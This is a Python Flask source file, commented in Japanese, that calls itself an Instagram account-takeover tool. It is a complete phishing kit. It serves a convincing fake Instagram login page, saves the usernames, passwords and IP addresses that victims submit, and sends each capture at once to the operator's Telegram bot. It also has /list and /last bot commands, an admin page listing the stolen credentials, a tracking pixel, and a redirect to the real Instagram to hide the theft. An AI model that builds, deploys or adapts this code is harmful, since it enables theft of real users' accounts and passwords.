# -*- coding: utf-8 -*-
"""
Instagram 乗っ取り(ログイン監視)ツール  /  Render デプロイ用

できること:
  * 偽のInstagramログイン画面を配信してユーザー名・パスワードを取得
  * 取得した内容をTelegram Botへ即時通知
  * /admin で取得済みアカウントの一覧を確認
  * /open.gif で開封(アクセス)トラッキング

必須の環境変数:
  BOT_TOKEN        … Telegram Bot のトークン
  TELEGRAM_CHAT_ID … 通知先チャットID

任意の環境変数:
  ADMIN_PASSWORD        … 管理画面パスワード (既定: admin)
  REDIRECT_TO_INSTAGRAM … "1" で本物のInstagramへ転送 (既定: 1)
  PORT                  … 待ち受けポート (Renderが自動設定)
"""

import os
import json
import time
import uuid
import threading
import traceback

import requests
from flask import Flask, request, redirect, jsonify, make_response, render_template_string


# ============================================================
#  設定
# ============================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, "accounts.json")

# ログイン後に本物のInstagramへ流すか ("0" で完了画面を表示)
REDIRECT_TO_INSTAGRAM = os.getenv("REDIRECT_TO_INSTAGRAM", "1") == "1"

# 通知先のTelegramチャットID (未設定なら通知だけスキップ)
TELEGRAM_CHAT_ID = (os.getenv("TELEGRAM_CHAT_ID") or "").strip()

# 管理画面のパスワード
ADMIN_PASSWORD = (os.getenv("ADMIN_PASSWORD") or "admin").strip()

# 待ち受けポート (RenderはPORTを自動で渡してくる)
PORT = int(os.getenv("PORT", "5000"))

# ------------------------------------------------------------
#  Telegram Bot トークン
#  Render の Environment に BOT_TOKEN か
#  TELEGRAM_BOT_TOKEN を設定してください。
#
#  ※ コピペ時に「全角スペース(U+3000)」が混ざると
#    SyntaxError: invalid non-printable character U+3000
#    で起動直後に落ちます。行頭の空白は半角スペースにすること。
# ------------------------------------------------------------
# (この下2行のインデントが全角だと必ずエラーになる)
BOT_TOKEN = (os.getenv("TELEGRAM_BOT_TOKEN")
        or os.getenv("BOT_TOKEN") or "").strip()

app = Flask(__name__)


# ============================================================
#  データ保存
# ============================================================

_lock = threading.Lock()


def load_accounts():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        traceback.print_exc()
        return []


def save_account(username, password, user_agent, ip):
    rec = {
        "id": uuid.uuid4().hex[:8],
        "username": username,
        "password": password,
        "user_agent": user_agent,
        "ip": ip,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    with _lock:
        data = load_accounts()
        data.append(rec)
        try:
            with open(DATA_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception:
            traceback.print_exc()
    return rec


def clear_accounts():
    with _lock:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump([], f)


# ============================================================
#  Telegram
# ============================================================

_last_update_id = 0


def telegram_api(method, **payload):
    if not BOT_TOKEN:
        return None
    url = "https://api.telegram.org/bot%s/%s" % (BOT_TOKEN, method)
    try:
        r = requests.post(url, json=payload, timeout=35)
        return r.json()
    except Exception:
        traceback.print_exc()
        return None


def send_to(chat_id, text):
    return telegram_api(
        "sendMessage",
        chat_id=chat_id,
        text=text,
        parse_mode="HTML",
        disable_web_page_preview=True,
    )


def notify_async(text):
    if not BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[telegram] BOT_TOKEN / TELEGRAM_CHAT_ID 未設定のためスキップ")
        return
    threading.Thread(target=send_to, args=(TELEGRAM_CHAT_ID, text), daemon=True).start()


def handle_command(text, chat_id):
    cmd = text.split()[0].split("@")[0].lower()
    if cmd in ("/start", "/help"):
        send_to(chat_id, "使い方:\n/list … 取得済み一覧\n/last … 最新1件\n/clear … 一覧を削除")
    elif cmd == "/list":
        data = load_accounts()
        if not data:
            send_to(chat_id, "まだ取得していません。")
            return
        lines = ["取得済み: %d件" % len(data)]
        for i, a in enumerate(data[-20:], 1):
            lines.append("%d) %s / %s (%s)" % (i, a["username"], a["password"], a["time"]))
        send_to(chat_id, "\n".join(lines))
    elif cmd == "/last":
        data = load_accounts()
        if not data:
            send_to(chat_id, "まだ取得していません。")
            return
        a = data[-1]
        send_to(chat_id, "最新: %s / %s (%s)" % (a["username"], a["password"], a["time"]))
    elif cmd == "/clear":
        clear_accounts()
        send_to(chat_id, "一覧を削除しました。")
    else:
        send_to(chat_id, "不明なコマンド: %s" % cmd)


def poll_telegram():
    global _last_update_id
    print("[bot] ポーリング開始")
    while True:
        try:
            res = telegram_api("getUpdates", offset=_last_update_id + 1, timeout=30)
            if res and res.get("ok"):
                for upd in res["result"]:
                    _last_update_id = upd["update_id"]
                    msg = upd.get("message") or {}
                    text = (msg.get("text") or "").strip()
                    chat = msg.get("chat") or {}
                    if text and chat.get("id") is not None:
                        handle_command(text, chat["id"])
        except Exception:
            traceback.print_exc()
            time.sleep(3)


# ============================================================
#  テンプレート
# ============================================================

LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; background:#fafafa; color:#262626; padding:40px 16px;
         font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         display:flex; flex-direction:column; align-items:center; }
  .expired { width:100%; max-width:350px; background:#fff; border:1px solid #dbdbdb;
             padding:10px; margin-bottom:12px; font-size:13px; text-align:center; }
  .card { width:100%; max-width:350px; background:#fff; border:1px solid #dbdbdb;
          padding:40px 40px 24px; text-align:center; }
  .logo { font-family:"Segoe Script","Brush Script MT",cursive; font-size:42px; margin:16px 0 28px; }
  input { width:100%; padding:9px 8px 7px; margin-bottom:6px; font-size:14px;
          border:1px solid #dbdbdb; border-radius:3px; background:#fafafa; }
  button { width:100%; margin-top:8px; padding:7px; border:0; border-radius:4px;
           background:#0095f6; color:#fff; font-weight:600; font-size:14px; cursor:pointer; }
  .or { display:flex; align-items:center; gap:16px; margin:20px 0; color:#8e8e8e; font-size:13px; }
  .or::before, .or::after { content:""; flex:1; height:1px; background:#dbdbdb; }
  .fb { color:#385185; font-weight:600; font-size:14px; text-decoration:none; }
  .forgot { display:block; margin-top:16px; font-size:12px; color:#00376b; text-decoration:none; }
</style>
</head>
<body>
{% if expired %}<div class="expired">セッションの有効期限が切れました。もう一度ログインしてください。</div>{% endif %}
  <div class="card">
    <div class="logo">Instagram</div>
    <form method="POST" action="/login">
      <input name="username" placeholder="電話番号、ユーザーネーム、またはメールアドレス" autocomplete="username" required>
      <input name="password" type="password" placeholder="パスワード" autocomplete="current-password" required>
      <button type="submit">ログイン</button>
    </form>
    <div class="or">または</div>
    <a class="fb" href="#">Facebookでログイン</a>
    <a class="forgot" href="#">パスワードをお忘れですか?</a>
  </div>
  <img src="/open.gif?ref=login" width="1" height="1" alt="">
</body>
</html>"""


DONE_PAGE = """<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>Instagram</title>
<style>body{font-family:-apple-system,sans-serif;background:#fafafa;display:flex;
justify-content:center;padding:60px 16px}.card{background:#fff;border:1px solid #dbdbdb;
padding:32px;max-width:350px;text-align:center;font-size:14px}</style></head>
<body><div class="card"><h3>ログインしました</h3>
<p style="color:#8e8e8e">@{{ username }} としてログインしています。</p>
</div></body></html>"""


ADMIN_PAGE = """<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>管理画面</title>
<style>body{font-family:-apple-system,sans-serif;background:#fafafa;padding:24px}
table{border-collapse:collapse;width:100%;background:#fff}
th,td{border:1px solid #dbdbdb;padding:8px;font-size:13px;text-align:left}
th{background:#f0f0f0}code{background:#f0f0f0;padding:2px 4px}</style></head>
<body>
<h2>取得済みアカウント ({{ count }}件)</h2>
<table>
<tr><th>#</th><th>時刻</th><th>ユーザー名</th><th>パスワード</th><th>IP</th><th>UA</th></tr>
{% for a in accounts %}
<tr><td>{{ loop.index }}</td><td>{{ a.time }}</td><td>{{ a.username }}</td>
<td><code>{{ a.password }}</code></td><td>{{ a.ip }}</td><td>{{ a.user_agent }}</td></tr>
{% endfor %}
</table>
</body></html>"""


# 1x1 透明GIF
GIF_1PX = bytes.fromhex(
    "47494638396101000100800000000000FFFFFF21F90401000000002C00000000010001000002024401003B"
)


# ============================================================
#  ルーティング
# ============================================================

@app.route("/")
def index():
    return render_template_string(LOGIN_PAGE, expired=request.args.get("expired") == "1")


@app.route("/login", methods=["POST"])
def login():
    username = (request.form.get("username") or "").strip()
    password = request.form.get("password") or ""

    ip = (request.headers.get("X-Forwarded-For") or request.remote_addr or "")
    ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    rec = save_account(username, password, ua, ip)

    msg = (
        "<b>Instagram ログイン情報を取得</b>\n"
        "ユーザー名: <code>%s</code>\n"
        "パスワード: <code>%s</code>\n"
        "IP: %s\n"
        "時刻: %s"
    ) % (username, password, ip, rec["time"])
    notify_async(msg)

    if REDIRECT_TO_INSTAGRAM:
        return redirect("https://www.instagram.com/")
    return render_template_string(DONE_PAGE, username=username)


@app.route("/open.gif")
def open_gif():
    resp = make_response(GIF_1PX)
    resp.headers["Content-Type"] = "image/gif"
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return resp


@app.route("/logout")
def logout():
    return redirect("/?expired=1")


@app.route("/admin")
def admin():
    if request.args.get("pw", "") != ADMIN_PASSWORD:
        return "パスワードが違います。/admin?pw=xxx でアクセスしてください。", 401
    data = load_accounts()
    return render_template_string(ADMIN_PAGE, accounts=data, count=len(data))


@app.route("/api/accounts")
def api_accounts():
    if request.args.get("pw", "") != ADMIN_PASSWORD:
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(load_accounts())


@app.route("/health")
def health():
    return jsonify({"ok": True, "bot_token": bool(BOT_TOKEN), "chat_id": bool(TELEGRAM_CHAT_ID)})


# ============================================================
#  起動
# ============================================================

if BOT_TOKEN:
    threading.Thread(target=poll_telegram, daemon=True).start()
else:
    print("[bot] BOT_TOKEN が未設定なのでポーリングを開始しません")

if __name__ == "__main__":
    print("BOT_TOKEN :", "設定済み" if BOT_TOKEN else "未設定")
    print("CHAT_ID   :", TELEGRAM_CHAT_ID or "未設定")
    print("listen on 0.0.0.0:%d" % PORT)
    app.run(host="0.0.0.0", port=PORT)
